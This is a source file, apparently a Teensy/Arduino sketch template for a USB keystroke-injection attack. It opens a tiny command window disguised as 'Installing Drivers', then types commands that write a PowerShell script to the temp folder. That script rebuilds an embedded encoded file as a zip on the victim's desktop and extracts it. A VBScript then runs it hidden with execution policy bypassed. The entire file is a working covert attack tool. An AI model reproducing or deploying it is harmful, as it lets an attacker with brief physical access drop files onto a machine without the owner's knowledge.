#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $temp = @^\" > %temp%\\dchm.ps1");
  ENCODEDFILE
  Keyboard.println("echo ^\"@ >> %temp%\\dchm.ps1");
  Keyboard.println("echo $ZFile = \"$env:Userprofile\\Desktop\\doc.zip\" >> %temp%\\dchm.ps1");
  Keyboard.println("echo $temp = $temp -replace \" \",\",\" >> %temp%\\dchm.ps1");
  Keyboard.println("echo [byte[]] $tmp =  $temp -split ',' >> %temp%\\dchm.ps1");  
  Keyboard.println("echo [System.IO.File]::WriteAllBytes($ZFile, $tmp) >> %temp%\\dchm.ps1");
  Keyboard.println("echo $sha = new-object -com shell.application >> %temp%\\dchm.ps1");
  Keyboard.println("echo $zipp = $sha.NameSpace($ZFile) >> %temp%\\dchm.ps1");
  Keyboard.println("echo $dest = $sha.namespace(\"$env:Userprofile\\Desktop\\\") >> %temp%\\dchm.ps1");
  Keyboard.println("echo $dest.Copyhere($zipp.items()) >> %temp%\\dchm.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dchm.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dchm.ps1\"),0,true >> %temp%\\dchm.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dchm.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS